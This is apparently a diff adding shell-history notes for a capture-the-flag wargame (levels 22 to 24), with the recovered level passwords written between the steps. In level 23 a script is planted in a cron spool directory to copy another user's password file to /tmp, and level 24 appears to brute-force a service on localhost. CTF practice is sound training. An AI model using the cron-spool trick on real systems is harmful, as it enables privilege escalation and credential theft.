@@ -222,5 +222,37 @@ EeoULMCra2q0dSkYj561DX7s1CpBuOBt
     7  cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
     8  history
 tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+# 22 level
+    1  ls -la /etc/cron.d/
+    2  cat /etc/cron.d/cronjob_bandit23
+    3  cat /usr/bin/cronjob_bandit23.sh
+    4  echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+    5  cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+    6  history
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+# 23 level
+    1  ls -la  /etc/cron.d/
+    2  cat /etc/cron.d/cronjob_bandit24
+    3  cat /usr/bin/cronjob_bandit24.sh
+    4  cd /var/spool/bandit24/foo
+    5  echo "cat /etc/bandit_pass/bandit24 > /tmp/anthonny.txt" > anthonny.sh
+    6  chmod 777 anthonny.sh
+    7  cat /tmp/anthonny.txt
+    8  history
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+# 24 level
+    1  nc localhost 30002
+    2  mktemp -d
+    3  cd /tmp/tmp.viLmeSz8nv
+    4  nano codigo.sh
+    5  chmod +x codigo.sh
+    6  ./codigo.sh
+    7  ls
+    8  sort result.txt | grep -v "Wrong!"
+    9 history
+iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+# 25 level
+
+
 
 
